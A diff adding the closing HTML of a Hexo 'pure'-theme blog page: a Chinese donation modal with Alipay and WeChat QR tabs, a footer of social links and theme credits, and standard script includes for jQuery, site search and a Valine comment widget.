+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/yejuns" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'z6IxiHbvPL5ILrUKq4XWV0py-gzGzoHsz',
+    appKey: 'MqpLIyiIaepCg2gruAt2hAEY',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
